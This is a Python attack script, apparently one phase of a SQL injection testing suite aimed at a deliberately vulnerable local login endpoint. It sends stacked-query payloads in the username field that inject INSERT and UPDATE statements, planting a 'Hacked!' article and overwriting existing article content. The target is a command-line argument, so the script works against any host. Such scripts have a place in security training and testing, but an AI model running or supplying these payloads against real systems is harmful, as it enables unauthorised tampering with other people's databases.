#!/usr/bin/env python3
"""Phase 8: Stacked Queries - Multiple Statements"""

import requests
import argparse


class Phase8StackedQueries:
    def __init__(self, target="http://localhost:5001"):
        self.target = target

    def execute_query(self, name, payload):
        try:
            data = {"username": payload, "password": "test"}
            response = requests.post(
                f"{self.target}/api/vulnerable/login", json=data, timeout=5)

            if response.status_code == 200:
                print(f"  ✅ {name}")
                return True
            else:
                print(f"  ❌ {name} - Status: {response.status_code}")
                return False
        except Exception as e:
            print(f"  ❌ {name} - Error: {str(e)}")
            return False

    def run(self):
        print("\n" + "="*70)
        print("PHASE 8: STACKED QUERIES")
        print("="*70)
        print(f"Target: {self.target}\n")
        print("⚠️ WARNING: These tests modify the database!")
        print("Press Ctrl+C to cancel or wait 5 seconds to continue...\n")

        import time
        time.sleep(5)

        tests = [
            ("Add New Article (Read)", "admin'; INSERT INTO Articles (title, content, author, createdAt) VALUES ('Hacked!', 'SQL injection works!', 'attacker', NOW()); --"),
            ("Modify Article (Update)",
             "admin'; UPDATE Articles SET content='[HACKED] This content was modified via SQL injection' WHERE id=1; --"),
        ]

        for name, payload in tests:
            self.execute_query(name, payload)
            print()

        print("="*70)
        print("✅ Phase 8 Complete")
        print("="*70)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5001")
    args = parser.parse_args()
    phase = Phase8StackedQueries(target=args.target)
    phase.run()
